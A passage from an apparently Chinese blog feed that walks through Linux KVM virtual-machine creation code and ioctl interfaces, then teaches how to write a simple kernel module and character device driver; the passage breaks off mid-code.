//核心函数：真正创建vm函数，通过该函数创建一个匿名inode    if (IS_ERR(kvm))        return PTR_ERR(kvm);#ifdef CONFIG_KVM_MMIO    r = kvm_coalesced_mmio_init(kvm);    if (r &lt; 0)        goto put_kvm;#endif    r = get_unused_fd_flags(O_CLOEXEC);    if (r &lt; 0)        goto put_kvm;    snprintf(kvm-&gt;stats_id, sizeof(kvm-&gt;stats_id),            &quot;kvm-%d&quot;, task_pid_nr(current));    file = anon_inode_getfile(&quot;kvm-vm&quot;, &amp;kvm_vm_fops, kvm, O_RDWR);    if (IS_ERR(file)) &#123;        put_unused_fd(r);        r = PTR_ERR(file);        goto put_kvm;    &#125;    /*     * Don&#39;t call kvm_put_kvm anymore at this point; file-&gt;f_op is     * already set, with -&gt;release() being kvm_vm_release().  In error     * cases it will be called by the final fput(file) and will take     * care of doing kvm_put_kvm(kvm).     */    if (kvm_create_vm_debugfs(kvm, r) &lt; 0) &#123;        put_unused_fd(r);        fput(file);        return -ENOMEM;    &#125;    kvm_uevent_notify_change(KVM_EVENT_CREATE_VM, kvm);    fd_install(r, file);    return r;put_kvm:    kvm_put_kvm(kvm);    return r;&#125;</code></pre><p>在该函数当中调用了<code>kvm_create_vm</code>之后，创建一个匿名inode，对应fop为<code>kvm_vm_fops</code>的结构体。在QEMU当中则是通过ioctl调用&#x2F;dev&#x2F;kvm的接口，返回该inode的文件描述符，之后对该VM的操作全部都是通过该文件描述符进行，对应的fop结构定义在<code>/virt/kvm/kvm_main.c</code>当中，代码如下：</p><pre><code class="hljs">static struct file_operations kvm_vm_fops = &#123;    .release        = kvm_vm_release,    .unlocked_ioctl = kvm_vm_ioctl,    .llseek= noop_llseek,    KVM_COMPAT(kvm_vm_compat_ioctl),&#125;;</code></pre><p>创建完VM，QEMU还需要对每个虚拟机的vCPU创建一个线程，在其中调用<code>kvm_vm_ioctl</code>中的<code>KVM_CREATE_VCPU</code>，该操作通过<code>kvm_vm_ioctl</code>&#x3D;&gt;<code>kvm_vm_ioctl_create_vcpu</code>&#x3D;&gt;<code>create_vcpu_fd</code>创建一个名为<code>kvm-vcpu</code>的匿名inode并返回其描述符。之后对每个vCPU的操作都通过该文件描述符进行，该匿名inode的fop定义在<code>/virt/kvm/kvm_main.c</code>当中，如下：</p><pre><code class="hljs">static struct file_operations kvm_vcpu_fops = &#123;    .release        = kvm_vcpu_release,    .unlocked_ioctl = kvm_vcpu_ioctl,    .mmap           = kvm_vcpu_mmap,    .llseek= noop_llseek,    KVM_COMPAT(kvm_vcpu_compat_ioctl),&#125;;</code></pre><h4 id="System-ioctl调用"><a href="#System-ioctl调用" class="headerlink" title="System ioctl调用"></a>System ioctl调用</h4><p>这里给出我们system ioctl的一些指令字</p><ul><li><code>KVM_CREATE_VM</code>:创建KVM虚拟机，较为重要，通过该参数KVM将返回虚拟机对应的一个文件描述符，它指向内核空间中的一个新的虚拟机。全新的虚拟机没有vCPU,也没有内存，这需要通过后续的ioctl进行配置，使用mmap()系统调用，则会直接返回虚拟机对应的虚拟内存空间，并且内存偏移量为0.</li><li><code>KVM_GET_API_VERSION</code>:查询当前KVM API 版本</li><li><code>KVM_GET_MSR_INDEX_LIST</code>:获得MSR索引表</li><li><code>KVM_CHECK_EXTENSION</code>:检查扩展支持情况</li><li><code>KVM_GET_VCPU_MMAP_SIZE</code>:运行虚拟机以及获得用户态空间共享的一片内存区域大小，返回vCPU mmap区域的大小</li><li><code>KVM_RUN</code>:ioctl通过共享的内存区域与用户空间进行通信</li></ul><h4 id="VM-ioctl调用"><a href="#VM-ioctl调用" class="headerlink" title="VM ioctl调用"></a>VM ioctl调用</h4><p>我们这里的ioctl大多需要通过之前<code>kvm_create_vm</code>函数返回的fd来进行操作，其中具体包括：配置内存，配置vCPU，运行虚拟机等，主要ioctl指令如下：</p><ul><li><code>KVM_CREATE_VCPU</code>:为虚拟机创建vCPU,返回一个vCPU对应的fd描述符，然后后续调用下面的<code>KVM_RUN</code>来启动</li><li><code>KVM_RUN</code>:运行VM虚拟机，通过mmap()系统调用函数映射vCPU的fd所在的内存空间来获得kvm_run结构体，该结构体位于内存偏移量0中，结束位置在<code>KVM_GET_VCPU_MMAP_SIZE</code></li><li><code>KVM_CREATE_IRQCHIP</code>:创建虚拟APIC，这里APIC应该是可编程中断控制器，然后将之后创建的vCPU关联到此APIC</li><li><code>KVM_IRQ_LINE</code>:对某虚拟APIC发送中断信号</li><li><code>KVM_GET_IRQCHIP</code>:读取APIC的中断标志信息</li><li><code>KVM_SET_IRQCHIP</code>:写入APIC的中断标志信息</li><li><code>KVM_GET_DIRTY_LOG</code>: 返回脏内存页的位图</li></ul><p>其中<code>kvm_run</code>结构体位于<code>/include/upai/linux/kvm.h</code>当中，其中数据结构过长，因此用一下形式来表示他的字段</p><table><thead><tr><th>字段名</th><th>功能</th></tr></thead><tbody><tr><td>request_interrupt_window</td><td>向vCPU当中发出一个中断插入请求，让vCPU做好相关的准备工作</td></tr><tr><td>ready_for_interrupt_injection</td><td>响应上面的中断请求，当此位有效，说明可以进行中断</td></tr><tr><td>if_flag</td><td>中断标识，如果使用了APIC，则不起作用</td></tr><tr><td>hardware_exit_reason</td><td>当vCPU因各种不明原因退出的时候，该字段保存了失败的描述信息</td></tr><tr><td>io</td><td>为一个结构体，当KVM产生硬件出错的原因是因为I&#x2F;O输出时，该结构体将保存出错的I&#x2F;O请求的数据</td></tr><tr><td>mmio</td><td>为一个结构体，当KVM产生出错的原因时时因为内存I&#x2F;O映射，该结构体将保存出错的内存I&#x2F;O映射请求的数据</td></tr></tbody></table><h4 id="vCPU-ioctl调用"><a href="#vCPU-ioctl调用" class="headerlink" title="vCPU ioctl调用"></a>vCPU ioctl调用</h4><p>主要针对具体的每一个虚拟机的vCPU进行配置，包括寄存器读写，中断设置，内存设置，开关调试，时钟管理等功能，其中ioctl寄存器控制是最重要的环节，如下：</p><table><thead><tr><th>指令字</th><th>功能</th></tr></thead><tbody><tr><td>KVM_GET_REGS</td><td>获取通用寄存器信息，返回kvm_regs</td></tr><tr><td>KVM_SET_REGS</td><td>设置通用寄存器信息</td></tr><tr><td>KVM_GET_SREGS</td><td>获取特殊寄存器信息,返回kvm_sregs</td></tr><tr><td>KVM_SET_SREGS</td><td>设置特殊寄存器信息</td></tr><tr><td>KVM_GET_MSRS</td><td>获取MSR寄存器信息,返回kvm_msrs</td></tr><tr><td>KVM_SET_MSRS</td><td>设置MSR寄存器信息</td></tr><tr><td>KVM_GET_FPU</td><td>获取浮点寄存器信息,返回kvm_fpu</td></tr><tr><td>KVM_SET_FPU</td><td>设置浮点寄存器信息</td></tr><tr><td>KVM_GET_XSAVE</td><td>获取vCPU的xsave寄存器信息,返回kvm_xsave</td></tr><tr><td>KVM_SET_XSAVE</td><td>设置vCPU的xsave寄存器信息</td></tr><tr><td>KVM_GET_XCRS</td><td>获取vCPU的xcr寄存器信息,返回kvm_xcrs</td></tr><tr><td>KVM_SET_XCRS</td><td>设置vCPU的xcr寄存器信息</td></tr></tbody></table><h3 id="4-kvm内核模块数据结构"><a href="#4-kvm内核模块数据结构" class="headerlink" title="4.kvm内核模块数据结构"></a>4.kvm内核模块数据结构</h3><p>在我们创建的虚拟机时，我们一般是通过<code>/dev/kvm</code>字符设备的System ioctl来创建虚拟机VM，其中kvm结构体是关键，一个虚拟机对应一个kvm结构体，虚拟机的创建过程实际上就是kvm结构体的创建和初始化过程，大致如下：</p><pre><code class="hljs">用户态iotcl(fd, KVM_CREATE_VM,...)---&gt;内核态kvm_dev_ioctl()    kvm_dev_ioctl_creat_vm()        kvm_create_vm()//首先虚拟机创建的主要函数            kvm_arch_alloc_vm()//为kvm结构体分配空间            kvm_arch_init_vm()//初始化kvm结构中的架构相关部分，比如中断等            hardware_enable_all()//开启硬件、架构的相关操作                hardware_enable_nolock()                    kvm_arch_hardware_enable()                        kvm_x86_ops-&gt;hardware_enable()            kzalloc()//分配memslots结构，并初始化为0            kvm_init_memslots_id()//初始化内存槽位slot的id信息            kvm_eventfd_init()//初始化时间通道            kvm_init_mmu_notifier()//初始化mmu操作的通知链            list_add(&amp;kvm-&gt;vm_list, &amp;vm_list)//将新创建的虚拟机的kvm结构加入到全局链表vm_list当中</code></pre>]]></content>
    
    
    <categories>
      
      <category>Virtual Machine</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
      <tag>vm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux_Kernel_0x01_LKMmaker</title>
    <link href="/2023/06/20/Linux-Kernel-0x01-LKMmaker/"/>
    <url>/2023/06/20/Linux-Kernel-0x01-LKMmaker/</url>
    
    <content type="html"><![CDATA[<h1 id="内核驱动简单认识"><a href="#内核驱动简单认识" class="headerlink" title="内核驱动简单认识"></a>内核驱动简单认识</h1><h2 id="自行编写驱动"><a href="#自行编写驱动" class="headerlink" title="自行编写驱动"></a>自行编写驱动</h2><p>首先咱们来介绍以下基础知识</p><h3 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device drivers）</li><li>设备驱动</li><li>文件系统驱动<br>…<br>内核扩展模块 (modules)<br>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</li></ul><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><hr><p>而Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。（而一般内核pwn中的漏洞出自这些模块里面，但是有的师傅也说内核也会有漏洞，这咱们以后再学）<br>这里比较常用的指令有以下几个：</p><ul><li>insmod: 讲指定模块加载到内核中</li><li>rmmod: 从内核中卸载指定模块</li><li>lsmod: 列出已经加载的模块</li><li>modprobe: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li><li>dmesg:输出内核态缓冲区的输出，这里跟用户态不一样，用户态一般输出到屏幕就完事了，内核中是输出到缓冲区。</li></ul><p>这里注意指令均需运行在管理员权限下。</p><hr><p>这里还注意一个特殊的函数ioctl</p><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p>直接查看 man 手册</p><pre><code class="hljs">NAME       ioctl - control deviceSYNOPSIS       #include &lt;sys/ioctl.h&gt;       int ioctl(int fd, unsigned long request, ...);DESCRIPTION       The ioctl() system call manipulates the underlying device parameters of special       files.  In particular, many  operating  characteristics  of  character  special       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument       fd must be an open file descriptor.       The second argument is a device-dependent request code.  The third argument  is       an  untyped  pointer  to  memory.  It&#39;s traditionally char *argp (from the days       before void * was valid C), and will be so named for this discussion.       An ioctl() request has encoded in it whether the argument is an in parameter or       out  parameter, and the size of the argument argp in bytes.  Macros and defines       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</code></pre><p>可以看出 ioctl 也是一个系统调用，用于与设备通信。<br>int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><p>使用 ioctl 进行通信的原因：</p><blockquote></blockquote><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。<br>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。<br>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p><h3 id="1-初级LKM模块"><a href="#1-初级LKM模块" class="headerlink" title="1.初级LKM模块"></a>1.初级LKM模块</h3><pre><code class="hljs">#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init kernel_module_init(void)&#123;    printk(&quot;&lt;1&gt;Hello the Linux kernel world!\n&quot;);    return 0;&#125;static void __exit kernel_module_exit(void)&#123;    printk(&quot;&lt;1&gt;Good bye the Linux kernel world! See you again!\n&quot;);&#125;module_init(kernel_module_init);module_exit(kernel_module_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;peiwithhao&quot;);</code></pre><p>当编写完成后咱们用make脚本进行编译链接，脚本如下</p><pre><code class="hljs">obj-m += peiwithhaoCURRENT_PATH := $(shell pwd)LINUX_KERNEL := $(shell uname -r)LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL)all:        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modulesclean:        make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean</code></pre><p>这里程序有几个注意点在以下标识</p><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><ul><li>linux&#x2F;module.h：对于LKM而言这是必须包含的一个头文件</li><li>linux&#x2F;kernel.h：载入内核相关信息</li><li>linux&#x2F;init.h：包含着一些有用的宏</li></ul><p>通常情况下，这三个头文件对于内核模块编程都是不可或缺的</p><h4 id="入口点-x2F-出口点"><a href="#入口点-x2F-出口点" class="headerlink" title="入口点&#x2F;出口点"></a>入口点&#x2F;出口点</h4><p>一个内核模块的入口点应当为 module_init()，出口函数应当为module_exit()，在内核载入&#x2F;卸载内核模块时会缺省调用这两个函数</p><p>在这里我们将自定义的两个函数的指针作为参数传入LKM入口函数&#x2F;出口函数中，以作为其入口&#x2F;出口函数</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p> __init &amp; __exit：这两个宏用以在函数结束后释放相应的内存<br>MODULE_AUTHOR() &amp; MODULE_LICENSE()：声明内核作者与发行所用许可证<br>printk()：内核态函数，用以在内核缓冲区写入信息，其中&lt;1&gt;标识着信息的紧急级别（一共有8个优先级，0为最高，相关宏定义于linux&#x2F;kernel.h中，这个大伙可以查查资料，在后面我一般用printk(KERN_INFO””),这个跟&lt;6&gt;好像时一个意思）</p><p>由于make我也才刚接触，所以这里不做解释免得误导大家。<br>这里继续<code>make</code>即可，然后咱们使用如下命令</p><pre><code class="hljs">insmod hellokernel.kolsmodrmmod hellokerneldmesg</code></pre><p>这里由于我之前这个模块过于简单就忘保存了，所以引用一下师傅的图<br><img src="https://i.loli.net/2021/02/28/vJitGgkFTzcPx8a.png"></p><h3 id="2-提供IO接口"><a href="#2-提供IO接口" class="headerlink" title="2.提供IO接口"></a>2.提供IO接口</h3><p>虽然说我们的新模块成功跑起来了，但是除了在内核缓冲区进行输入输出以外好像就做不了什么了，我们希望我们写的内核模块能够向我们提供更多的功能并能够让用户与其进行交互，以发挥更多的作用<br>所以这里我们的首要步骤就是注册设备。而为了与设备进行交互，我们就需要驱动来为咱们隐藏底层做的很多事，就好比我想用打印机，但要是咱们编程的时候既要考虑到用户这边，又要考虑到设备这边的问题，咱们就太累了，幸好在计算机中没有什么是加一层解决不了的，如果不行，那就加两层。<br>所以出现了驱动的这一概念，驱动也就帮咱们隐藏了底层实现，咱们调用的时候只需要会open，read，write即可。</p><h4 id="设备分类"><a href="#设备分类" class="headerlink" title="设备分类"></a>设备分类</h4><p>在Linux中I&#x2F;O设备分为如下两类：</p><ul><li>字符设备：在I&#x2F;O传输过程中以字符为单位进行传输的设备，例如键盘、串口等。字符设备按照字符流的方式被有序访问，不能够进行随机读取</li><li>块设备：在块设备中，信息被存储在固定大小的块中，每个块有着自己的地址，例如硬盘、SD卡等。用户可以对块设备进行随机访问——从任意位置读取一定长度的数据</li></ul><h4 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h4><p>在注册设备之前，我们需要用到一个结构体——file_operations来完成对设备的一些相关定义，该结构体定义于include&#x2F;linux&#x2F;fs.h中，相关源码比较长不在此贴出，在其中定义了大量的函数指针,这里再之后的代码会体现出来，他也就是定义了open、read等系统调用的函数指针。</p><p>一个文件应当拥有一个file_operations实例，并指定相关系统调用函数指针所指向的自定义函数，在后续进行设备的注册时会使用该结构体</p><h4 id="主设备号-amp-次设备号"><a href="#主设备号-amp-次设备号" class="headerlink" title="主设备号 &amp; 次设备号"></a>主设备号 &amp; 次设备号</h4><p>在Linux内核中，使用类型dev_t（unsigned long）来标识一个设备的设备号。<br>一个字符的设备号由主设备号与次设备号组成，高字节存储主设备号，低字节存储次设备号：<br>主设备号：标识设备类型，使用宏MAJOR(dev_t dev)可以获取主设备号<br>次设备号：用以区分同类型设备，使用宏MINOR(dev_t dev)可以获取次设备号<br>Linux还提供了一个宏 MKDEV(int major, int minor);，用以通过主次设备号生成对应的设备号</p><h4 id="设备节点（struct-device-node-amp-struct-device）"><a href="#设备节点（struct-device-node-amp-struct-device）" class="headerlink" title="设备节点（struct device_node &amp; struct device）"></a>设备节点（struct device_node &amp; struct device）</h4><p>由于Linux中所有的设备都以文件的形式进行访问，这些文件存放在&#x2F;dev目录下，一个文件就是一个设备节点，如下图<br><img src="http://imgsrc.baidu.com/forum/pic/item/dcc451da81cb39dbc797769495160924aa183098.jpg"></p><p>在Linux kernel中使用结构体device描述一个设备，该结构体定义于include&#x2F;linux&#x2F;device.h（内核源码路径）中，每个设备在内核中都有着其对应的device实例，其中记录着设备的相关信息</p><p>在DTS（Device Tree Source，设备树）中则使用device_node结构体表示一个设备</p><h4 id="设备类（struct-class）"><a href="#设备类（struct-class）" class="headerlink" title="设备类（struct class）"></a>设备类（struct class）</h4><p>在Linux kernel中使用结构体class用以表示高层次抽象的设备，该结构体定义于include&#x2F;linux&#x2F;device&#x2F;class.h中</p><p>每个设备节点实例中都应当包含着一个指向相应设备类实例的指针</p><p>设备的注册与注销<br>方便起见，我们接下来将会注册一个字符型设备，大致的一个步骤如下：</p><p>使用由内核提供的函数<code>register_chrdev(unsigned int major, const char *name, const struct file_operations *fops)</code>进行字符型设备注册，该函数定义于include&#x2F;linux&#x2F;fs.h，会将注册成功后的主设备号返回，若失败则会返回一个负值，参数说明如下：<br>major：主设备号，若为0则由内核分配主设备号<br>name：设备名，由用户指定<br>fops：该设备的文件操作系统（file_operations结构体）指针<br>使用宏class_create(owner, name)创建设备类，该宏定义于include&#x2F;linux&#x2F;device.h中，其核心调用函数是__class_create(struct module *owner, const char *name, struct lock_class_key *key)</p><p>使用函数<code>device_create(struct class *cls, struct device *parent, dev_t devt, void *drvdata, const char *fmt, ...)</code>创建设备节点，若成功则最终会在&#x2F;dev目录下生成我们的设备节点文件，各参数说明如下：</p><p>cls：该设备的设备类<br>parent：该设备的父设备节点，通常情况下应当为某种总线或主机控制器，若该设备为顶级设备则设为NULL<br>devt：该设备的设备号<br>drvdata：该驱动的相关信息，若无则填NULL<br>fmt：设备名称<br>设备的注销则是逆着上面的进程进行，同样有着相对应的三个函数：<code>device_destroy(struct class *cls, dev_t devt)</code>、<code>class_destroy(struct class *cls)</code>、<code>unregister_chrdev(unsigned int major, const char *name)</code>，用法相似，这里就不一一赘叙了</p><p>✳ 需要注意的是若是注册设备的进程中的某一步出错了，我们在退出内核态函数之前应当手动调用注销函数清理原先的相关资源</p><h4 id="设备权限"><a href="#设备权限" class="headerlink" title="设备权限"></a>设备权限</h4><p>内核模块运行在内核空间，所创建的设备节点只有root用户才有权限进行读写，对于其他用户而言便毫无意义，这并不是我们想要的，因此我们需要通过进一步的设置使得所有用户都有权限通过设备节点文件与我们的内核模块进行交互</p><p>在内核中使用inode结构体表示一个文件，该结构体定义于include&#x2F;linux&#x2F;fs.h中，其中用以标识权限的是成员i_mode</p><p>而在内核中对于使用flip_open()打开的文件，Linux内核中使用 file 结构体进行描述，该结构体定义于include&#x2F;linux&#x2F;fs.h中，其中有着指向内核中该文件的 inode 实例的指针，使用file_inode()函数可以获得一个 file 结构体中的 inode 结构体指针</p><p>那么我们不难想到，若是在内核模块中使用file_open()函数打开我们的设备节点文件，随后修改 file 结构体中的 inode 指针指向的 inode 实例的 i_mode 成员，便能够修改该文件的权限,</p><p>大伙可以照着敲一敲，逻辑很简单。</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#define DEVICE_NAME &quot;peiwithhao&quot;#define DEVICE_PATH &quot;/dev/peiwithhao&quot;#define CLASS_NAME &quot;P_Wmodule&quot;static int major_num;static struct class * module_class = NULL;static struct device * module_device = NULL;static struct file * __file = NULL;struct inode * __inode = NULL;static struct file_operations PW_module_fo = &#123;                                                        //descripe the device        .owner = THIS_MODULE&#125;;static int __init kernel_module_init(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:]Module loaded. Start to register device ...\n&quot;);        major_num = register_chrdev(0,DEVICE_NAME,&amp;PW_module_fo);                        //register the major number        if(major_num &lt;0)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register a major number! \n&quot;);                return major_num;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Register completed ,major number: %d\n&quot;,major_num);                module_class = class_create(THIS_MODULE,CLASS_NAME);                                //create the struct class        if(IS_ERR(module_class))&#123;                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register class device!\n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Class Register complete. \n&quot;);        module_device = device_create(module_class,NULL,MKDEV(major_num,0),NULL,DEVICE_NAME);        //create the device        if(IS_ERR(module_class))&#123;                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to create the device! \n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module Register complete. \n&quot;);        __file = filp_open(DEVICE_PATH, O_RDONLY,0);                                                //open the file ,now that device        if(IS_ERR(__file))&#123;                device_destroy(module_class,MKDEV(major_num,0));                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to change module privilege! \n&quot;);                return PTR_ERR(__file);        &#125;        __inode = file_inode(__file);                __inode-&gt;i_mode |= 0666;                                        filp_close(__file,NULL);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module privilege change complete.... \n&quot;);        return 0;&#125;static void __exit kernel_module_exit(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Start to clean up the module... \n&quot;);        device_destroy(module_class,MKDEV(major_num,0));        class_destroy(module_class);        unregister_chrdev(major_num,DEVICE_NAME);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module clean up complete. See you next time! \n&quot;);&#125;module_init(kernel_module_init);                //inmodule_exit(kernel_module_exit);                //outMODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;dawn&quot;);</code></pre><p>之后就是编译make，然后测试，在这里咱们注册了一个device，所以咱们也可以到&#x2F;dev目录底下查看<br>dmesg查看效果<br><img src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5054bcf190c035e5dde6116eb4.jpg"></p><blockquote><p>这里注意下，为什么都要先lsmod 再rmmod呢，因为咱们在注册的时候会调用init那个函数，卸载时会调用exit，由于需要都看看进程所以一起用来算了</p></blockquote><h4 id="3-编写系统调用接口"><a href="#3-编写系统调用接口" class="headerlink" title="3.编写系统调用接口"></a>3.编写系统调用接口</h4><p>我们编写如下的三个简单的函数使得用户应用程式可以通过open、close、read、write、ioctl与其进行交互</p><p>在这里我们引入了自旋锁spinlock_t类型变量以增加对多线程的支持</p><p>需要注意的是file_operations结构体中ioctl的函数指针应当为unlocked_ioctl，close对应的函数指针应当为release</p><p> 还有就是内核空间与用户空间之间传递数据应当使用copy_from_user(void *to, const void *from, unsigned long n)、copy_to_user(void *to, const void *from, unsigned long n)函数，从函数名咱们就可以知道他的妙用。</p><p>代码如下，我稍作解释，对了这里分出了头文件，因为文件太长了，我一切跟着师傅走然后慢慢理解<br>首先是p_wmodule.h</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#define DEVICE_NAME &quot;peiwithhao&quot;#define DEVICE_PATH &quot;/dev/peiwithhao&quot;#define CLASS_NAME &quot;p_wmodule&quot;#define NOT_INIT 0xffffffff#define READ_ONLY 0x1000#define ALLOW_WRITE 0x1001#define BUFFER_RESET 0x1002static int major_num;static int p_w_module_mode = READ_ONLY;static struct class * module_class = NULL;static struct device * module_device = NULL;static void * buffer = NULL;static spinlock_t spin;static struct file * __file = NULL;struct inode * __inode = NULL;static int __init kernel_module_init(void);static void __exit kernel_module_exit(void);static int p_w_module_open(struct inode *,struct file *);static ssize_t p_w_module_read(struct file *,char __user *,size_t,loff_t *);static ssize_t p_w_module_write(struct file*,const char __user * ,size_t,loff_t *);static int p_w_module_release(struct inode *, struct file *);static long p_w_module_ioctl(struct file *,unsigned int,unsigned long);static long __internal_p_w_module_ioctl(struct file * __file,unsigned int cmd,unsigned long param);static struct file_operations PW_module_fo = &#123;                                                        //descripe the device        .owner = THIS_MODULE,        .unlocked_ioctl = p_w_module_ioctl,        .open = p_w_module_open,        .read = p_w_module_read,        .write = p_w_module_write,        .release = p_w_module_release,&#125;;</code></pre><p>再者之后就是p_wmodule.c了</p><pre><code class="hljs">#include&lt;linux/module.h&gt;                //it have to exist#include&lt;linux/kernel.h&gt;                //loading the information of kernel#include&lt;linux/init.h&gt;                        //contain some useful define#include&lt;linux/fs.h&gt;                        #include&lt;linux/device.h&gt;#include&lt;linux/slab.h&gt;#include &quot;p_wmodule.h&quot;module_init(kernel_module_init);                //inmodule_exit(kernel_module_exit);                //outMODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;dawn&quot;);        static int __init kernel_module_init(void)&#123;        spin_lock_init(&amp;spin);        printk(KERN_INFO &quot;[peiwithhao_TestModule:]Module loaded. Start to register device ...\n&quot;);        major_num = register_chrdev(0,DEVICE_NAME,&amp;PW_module_fo);                        //register the major number        if(major_num &lt;0)&#123;                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register a major number! \n&quot;);                return major_num;        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Register completed ,major number: %d\n&quot;,major_num);                module_class = class_create(THIS_MODULE,CLASS_NAME);                                //create the struct class        if(IS_ERR(module_class))&#123;                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to register class device!\n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Class Register complete. \n&quot;);        module_device = device_create(module_class,NULL,MKDEV(major_num,0),NULL,DEVICE_NAME);        //create the device        if(IS_ERR(module_class))&#123;                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Failed to create the device! \n&quot;);                return PTR_ERR(module_class);        &#125;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module Register complete. \n&quot;);        __file = filp_open(DEVICE_PATH, O_RDONLY,0);                                                //open the file ,now that device        if(IS_ERR(__file))&#123;                device_destroy(module_class,MKDEV(major_num,0));                class_destroy(module_class);                unregister_chrdev(major_num,DEVICE_NAME);                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Unable to change module privilege! \n&quot;);                return PTR_ERR(__file);        &#125;        __inode = file_inode(__file);                __inode-&gt;i_mode |= 0666;                                        filp_close(__file,NULL);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module privilege change complete.... \n&quot;);        return 0;&#125;static void __exit kernel_module_exit(void)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Start to clean up the module... \n&quot;);        device_destroy(module_class,MKDEV(major_num,0));        class_destroy(module_class);        unregister_chrdev(major_num,DEVICE_NAME);        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module clean up complete. See you next time! \n&quot;);&#125;static long p_w_module_ioctl(struct file * __file, unsigned  int cmd , unsigned long param)&#123;        long ret;        spin_lock(&amp;spin);        ret = __internal_p_w_module_ioctl(__file , cmd, param);        spin_unlock(&amp;spin);        return ret;&#125;static long __internal_p_w_module_ioctl(struct file *__file,unsigned int cmd, unsigned long param)&#123;        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Received operation code : %d\n&quot;,cmd);        switch(cmd)&#123;                case READ_ONLY:                        if(!buffer)&#123;                                printk(KERN_INFO &quot;[peiwithhao_TestModule:] Please reset the buffer at first!\n&quot;);                                return -1;                        &#125;                        printk(KERN_INFO &quot;[peiwithhao_TestModule:] Module operation mode reset to READ_ONLY...\n&quot;);                        p_w_module_mode = READ_ONLY;                        break;                case 